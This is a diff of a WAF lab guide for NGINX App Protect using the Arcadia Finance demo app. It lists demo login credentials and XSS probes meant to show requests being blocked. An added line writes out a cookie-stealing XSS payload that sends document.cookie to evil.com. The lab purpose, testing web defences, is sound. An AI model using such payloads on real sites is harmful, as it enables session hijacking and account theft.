@@ -3,20 +3,17 @@ Access the Application and Test the WAF
 
 We knew that NAP provides protection against Layer 7 attacks, lets find out the security posture of our application.
 
-Launch the Firefox browser from Jumpbox and click on bookmark Arcadia Finance, this should open a landing page, click on login and provide the credentials as before and log into the application
-  
-    #. In the Browser, click on the bookmark ``Aracdia Links>Arcadia NAP Centos``
+Launch the Firefox browser and open Arcadia Finance app:
+
+    #. In the Browser, open NGINX Ingress Controller URL to access Arcadia app (replace with the nginx-ingress EXTERNAL-IP): http://EXTERNAL-IP/
     #. Click on ``Login``
     #. Login with ``matt:ilovef5``
     #. You should see all the apps running (main, back, app2 and app3)
 
-    #.  Try some attacks like injections or XSS: ``http://app-protect-centos.arcadia-finance.io/<script>``
 
+Now execute the same XSS attack that we did in Module1, observe the attack is blocked now and the user is provided with a support ID
 
-
-- Now execute the same XSS attack that we did in Module1, observe the attack is blocked now and the user is provided with a support ID
-
-You will be blocked and see the default Blocking page
+- Execute a XSS attack by appending the ?a=<script> to the end of application URL, you should see the request is blocked and see the default Blocking page
 
         .. code-block:: html
             
@@ -33,11 +30,16 @@ You will be blocked and see the default Blocking page
    :align: center
 
 
-- Execute the second attack from Module 1 and observe the results
+- Execute the second attack y appending ?item='><script>document.location='http://evil.com/steal'+document.cookie</script> to the application URL, and observe the results
 
 .. image:: ./pictures/image19.png
    :align: center
  
+
+Feel free to execute any attacks you would like and observe the results.
+
+Congratulations on securing your application!
+
 
 **Here are some optional attacks you can try**
 
